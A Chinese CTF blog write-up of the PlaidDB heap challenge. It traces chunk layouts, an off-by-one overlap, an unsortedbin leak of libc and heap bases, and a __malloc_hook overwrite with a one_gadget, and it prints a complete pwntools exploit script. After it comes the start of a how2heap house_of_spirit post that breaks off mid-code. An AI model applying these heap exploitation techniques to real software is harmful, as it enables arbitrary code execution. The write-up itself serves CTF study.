<p>这里之后我去参考了一些wp，发现大家都是用的结构体前面两个成员，row key ptr还有data size进行的leak，而且对应的指针是unsortedbin指针，因为unsortedbin指针的偏移会指向top_chunk，使用这种泄露方式可以同时泄露出libc_base和heap_base，再就是how2heap中这个off_by_one是用来malloc的时候不改变下个chunk的prev_size，但是这个题用off_by_one来free合并前面的chunk似乎更简单一点</p>
<p>接着构造Double free，但是如果想要修改malloc hook之类的地方，我发现我不仅需要一个0x70的fastchunk（参考之前写的babyheap），还需要一个smallbin合并时用来unlink，所以得回去再重新加上（当然此时的chunk链结构就又发生了变化，保证data2_n被free时能合并前面的chunk，而且0x70chunk必须在这个smallbin之后）</p>
<p>计算size并更改之后：</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td></td>
<td></td>
<td></td>
<td>data1_n</td>
</tr>
<tr>
<td></td>
<td></td>
<td>fastbin</td>
<td>fastbin</td>
<td>fastbin</td>
<td></td>
</tr>
</tbody></table>
<p>然后一步步构造之前构造过的</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>rowkey2</td>
<td>结点2</td>
<td></td>
<td>data1_n</td>
<td>data2</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>然后把data2后面造成一个结点为了0x90+0x40的chunk被分割之后直接DUMP leak</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>…</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>rowkey2</td>
<td>结点2</td>
<td></td>
<td>data1_n</td>
<td>data2</td>
<td></td>
<td>data2_n</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td></td>
<td>fastbin</td>
<td>fastbin</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th></th>
<th></th>
<th></th>
<th>…</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>rowkey2</td>
<td>结点2</td>
<td>rowkey3</td>
<td>data1_n</td>
<td>data3</td>
<td>结点3</td>
<td>data2_n</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>开始构造off_by_one</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>…</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>rowkey2</td>
<td>结点2</td>
<td>rowkey3</td>
<td>data1_n</td>
<td>data3</td>
<td>结点3</td>
<td></td>
<td></td>
<td></td>
<td>data2_nn</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td>fastbin</td>
<td>fastbin</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>0x60</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>rowkey2</td>
<td>结点2</td>
<td>rowkey3</td>
<td>data1_n</td>
<td>data3</td>
<td>结点3</td>
<td></td>
<td>结点4</td>
<td>rowkey4</td>
<td>data2_nn</td>
<td>data4</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>0x60</th>
<th>0x40</th>
<th>0x20</th>
<th>0x110</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>rowkey2</td>
<td>结点2</td>
<td>rowkey3</td>
<td>data1_n</td>
<td>data3</td>
<td>结点3</td>
<td></td>
<td>结点4</td>
<td>rowkey4</td>
<td>data2_nn</td>
<td></td>
<td></td>
<td></td>
<td>data4_n</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td>fastbin</td>
<td>fastbin</td>
<td></td>
</tr>
</tbody></table>
<p>终于具备漏洞利用的条件了</p>
<p>再添加一个结点5trigger off_by_one</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>0x60</th>
<th>0x40</th>
<th>0x20</th>
<th>0x110</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>rowkey2</td>
<td>结点2</td>
<td>rowkey3</td>
<td>data1_n</td>
<td>data3</td>
<td>结点3</td>
<td></td>
<td>结点4</td>
<td>rowkey4</td>
<td>data2_nn</td>
<td>data5</td>
<td>结点5</td>
<td>rowkey5</td>
<td>data4_n</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>删掉结点2、1、4(这里我调试之后回来2删了，否则后面树操作好像会出错，&gt;&gt;&gt;…&lt;&lt;&lt;中间的是unsorted chunk)</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>0x60</th>
<th>0x40</th>
<th>0x20</th>
<th>0x110</th>
<th>0x20</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>rowkey3</td>
<td></td>
<td>data3</td>
<td>结点3</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>data5</td>
<td>结点5</td>
<td>rowkey5</td>
<td>data4_n</td>
<td></td>
</tr>
<tr>
<td>fastbin</td>
<td>fastbin</td>
<td>fastbin</td>
<td>fastbin</td>
<td></td>
<td>&gt;&gt;&gt;</td>
<td></td>
<td></td>
<td>fastbin</td>
<td>fastbin</td>
<td>fastbin</td>
<td>fastbin</td>
<td></td>
<td></td>
<td>&lt;&lt;&lt;</td>
<td></td>
<td>fastbin</td>
</tr>
</tbody></table>
<p>然后申请一个data为0xD0的块a，但是由于我申请的大小太玄学了…top_chunk结尾刚好是\x00，打印会失败，所以我又更改了data5的大小，然后就可以成功leak了，此时的堆应该是这样（这里我把同大小的fastchunk在fastbin链表上的位置通过调试标出来了最先被malloc出去的数字最大，方便后面的制表）：</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>0x60</th>
<th>0x40</th>
<th>0x20</th>
<th>0x110</th>
<th>0x20</th>
<th>0x110</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>rowkey3</td>
<td>(a data)</td>
<td>data3(a data)</td>
<td>结点3</td>
<td></td>
<td>结点a</td>
<td></td>
<td></td>
<td></td>
<td>结点5</td>
<td>rowkey5</td>
<td>data4_n</td>
<td>rowkey a</td>
<td>data5_n</td>
</tr>
<tr>
<td>fastbin2</td>
<td>fastbin2</td>
<td>fastbin1</td>
<td>fastbin1</td>
<td></td>
<td></td>
<td></td>
<td>&gt;&gt;&gt;</td>
<td>fastbin1</td>
<td></td>
<td>fastbin3</td>
<td>fastbin2</td>
<td>fastbin1</td>
<td></td>
<td>&lt;&lt;&lt;</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>leak之后我们再申请一个data size为0xB0的chunk b，就刚好把接下来0x70和0x40这个chunk重复利用了，而0x70这个chunk在fastbin里面，只要把他的fd改到__malloc_hook上方即可(具体位置见之前写的的babyheap)</p>
<p>不过至于具体的data填充操作我调试了很久很久，稍不注意就会在各种地方出错，建议直接把内存全部打印出来然后照着上面的填进去，这样比较好</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>0x60</th>
<th>0x40</th>
<th>0x20</th>
<th>0x110</th>
<th>0x20</th>
<th>0x110</th>
</tr>
</thead>
<tbody><tr>
<td>结点b</td>
<td></td>
<td></td>
<td></td>
<td>rowkey3</td>
<td>(a data)</td>
<td>data3(a data)</td>
<td>结点3(data b)</td>
<td>(data b)</td>
<td>结点a</td>
<td>rowkeyb</td>
<td></td>
<td></td>
<td>结点5</td>
<td>rowkey5</td>
<td>data4_n</td>
<td>rowkey a</td>
<td>data5_n</td>
</tr>
<tr>
<td></td>
<td>fastbin2</td>
<td>fastbin1</td>
<td>fastbin1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin1</td>
<td>&gt;&gt;&gt;</td>
<td></td>
<td>fastbin2</td>
<td>fastbin1</td>
<td></td>
<td>&lt;&lt;&lt;</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>然后我们在申请一个没有意义的c(data为0x70的fastchunk)，只是为了下一次能把__malloc_hook那块内存给malloc出来</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x90</th>
<th>0x40</th>
<th>0x40</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x60</th>
<th>0x60</th>
<th>0x40</th>
<th>0x20</th>
<th>0x110</th>
<th>0x20</th>
<th>0x110</th>
</tr>
</thead>
<tbody><tr>
<td>结点b</td>
<td>rowkey c</td>
<td></td>
<td>结点c</td>
<td>rowkey3</td>
<td>(a data)</td>
<td>data3(a data)</td>
<td>结点3(data b)</td>
<td>(data b)(data c)</td>
<td>结点a</td>
<td>rowkeyb</td>
<td></td>
<td></td>
<td>结点5</td>
<td>rowkey5</td>
<td>data4_n</td>
<td>rowkey a</td>
<td>data5_n</td>
</tr>
<tr>
<td></td>
<td></td>
<td>fastbin1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>&gt;&gt;&gt;</td>
<td></td>
<td>fastbin2</td>
<td>fastbin1</td>
<td></td>
<td>&lt;&lt;&lt;</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>这里好像再进行申请时会出错，我删结点5好像也删不掉(显示notfound，可能是因为a被unsortedbin指针破坏，然后树结构改变了的原因)，本来以为到这里就会嗝屁失败了，但是b被我成功删掉了(这可能就是玄学吧XD，希望以后不要有这种情况)</p>
<p>然后malloc一个0x70的chunk修改__malloc_hook</p>
<p>不过在PUT里面的malloc触发one_gadget死活不成功，本来以为又要嗝屁了55555，结果在我坚持尝试的努力下，在DEL中成功将one_gadget触发成功</p>
<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'PlaidDB'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"GET"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"PUT"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter data size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter data:"</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"DUMP"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"DEL"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">"th3fl4g"</span>, <span class="number">0x88</span>, <span class="string">'\x00'</span>*<span class="number">0x88</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x38</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x68</span>)</span><br><span class="line">PUT(<span class="string">"3333333"</span>, <span class="number">0x38</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x58</span>, <span class="string">'\x00'</span>*<span class="number">0x58</span>)</span><br><span class="line">PUT(<span class="string">'4444444'</span>, <span class="number">0x58</span>, <span class="string">'\x00'</span>*<span class="number">0x58</span>)</span><br><span class="line">PUT(<span class="string">'4444444'</span>, <span class="number">0xf8</span>, <span class="string">'\x00'</span>*<span class="number">0xf8</span>)</span><br><span class="line">PUT(<span class="string">'5'</span>*<span class="number">0x10</span>+p64(<span class="number">0x300</span>), <span class="number">0x108</span>, <span class="string">'\x00'</span>*<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">'2222222'</span>)</span><br><span class="line">DEL(<span class="string">'th3fl4g'</span>)</span><br><span class="line">DEL(<span class="string">'4444444'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'brva 0x1334'</span>)</span><br><span class="line">PUT(<span class="string">'a'</span>, <span class="number">0xc8</span>, <span class="string">'\x00'</span>*<span class="number">0xc8</span>)<span class="comment">#D0 chunk</span></span><br><span class="line"></span><br><span class="line">DUMP()</span><br><span class="line"><span class="comment">#p.recvuntil('bytes')</span></span><br><span class="line">p.recvuntil(<span class="string">'['</span>)</span><br><span class="line">heap_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x610</span></span><br><span class="line">p.recvuntil(<span class="string">', '</span>)</span><br><span class="line">libc_base=int(p.recvuntil(<span class="string">' '</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + hex(heap_base)+<span class="string">','</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">fill1=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x180</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x390</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4aed</span>)+p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">PUT(<span class="string">'b'</span>,<span class="number">0xa8</span>,fill1)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">'c'</span>,<span class="number">0x68</span>,<span class="string">'no mean'</span>.ljust(<span class="number">0x48</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0x200</span>)+p64(libc_base+<span class="number">0x3c4b78</span>)*<span class="number">2</span>+<span class="string">'\x00'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">'b'</span>)</span><br><span class="line"><span class="comment">### Write different one_gadget</span></span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0x45216)+'\x00'*77)</span></span><br><span class="line">PUT(<span class="string">'gogogo'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">19</span>+p64(libc_base+<span class="number">0x4526a</span>)+<span class="string">'\x00'</span>*<span class="number">77</span>)</span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0xf02a4)+'\x00'*77)</span></span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0xf1147)+'\x00'*77)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># try try try</span></span><br><span class="line">DEL(<span class="string">'gogogo'</span>)</span><br><span class="line"><span class="comment">#GET('')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这个堆题应该是目前为止写的时间最长，也是最麻烦的一个堆题，主要是树形结构的逆向很耗时间，然后再off_by_one的构造上也要花不少功夫，合并的内存块前面必须要满足unlink条件，这个就需要精力去考虑一下在这种复杂堆管理下的构造方式，再就是一定要清楚各个模块对chunk操作的顺序，否贼写起来真的毫无头绪。再就是这个leak的方式也是我第一次见，通过unsortedbin指针，既打印了libc的地址又打印了堆的地址，承认这个操作是看师傅们的wp来的，以后一定在leak方面加把劲XD。最后就是玄学树操作，比赛碰到这种一定要不求甚解，只要能不影响漏洞利用就可以了，要不然浪费大量时间。<br>另外这题师傅们的构造更好一点，师傅们的构造是这样的，0x90加到0x100 chunk之前刚好是0x200的一个chunk</p>
<table>
<thead>
<tr>
<th>node A</th>
<th>dataB</th>
<th>rkB</th>
<th>rkA</th>
<th>dataA</th>
<th>nodeB</th>
<th>nodeC</th>
<th>rkC</th>
<th></th>
<th>nodeD</th>
<th>rkd(exp)</th>
<th>dataC_n</th>
<th>dataD</th>
</tr>
</thead>
<tbody><tr>
<td>0x40</td>
<td>0x20</td>
<td>0x20</td>
<td>0x20</td>
<td>0x90</td>
<td>0x40</td>
<td>0x40</td>
<td>0x20</td>
<td>0x70</td>
<td>0x40</td>
<td>0x20</td>
<td>0x100</td>
<td>0x20</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin1</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>最后：多撸源码</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/06/how2heap-house-of-spirit-OREO/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/06/how2heap-house-of-spirit-OREO/" class="post-title-link" itemprop="url">how2heap - house_of_spirit&OREO</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-06 23:30:16" itemprop="dateCreated datePublished" datetime="2020-02-06T23:30:16+08:00">2020-02-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-29 18:08:15" itemprop="dateModified" datetime="2020-02-29T18:08:15+08:00">2020-02-29</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/06/how2heap-house-of-spirit-OREO/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/06/how2heap-house-of-spirit-OREO/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="how2heap-house-of-spirit-amp-OREO"><a href="#how2heap-house-of-spirit-amp-OREO" class="headerlink" title="how2heap - house_of_spirit&amp;OREO"></a>how2heap - house_of_spirit&amp;OREO</h1><p>ubuntu 16.04  libc2.23</p>
<h1 id="house-of-spirit-c"><a href="#house-of-spirit-c" class="headerlink" title="house_of_spirit.c"></a>house_of_spirit.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span 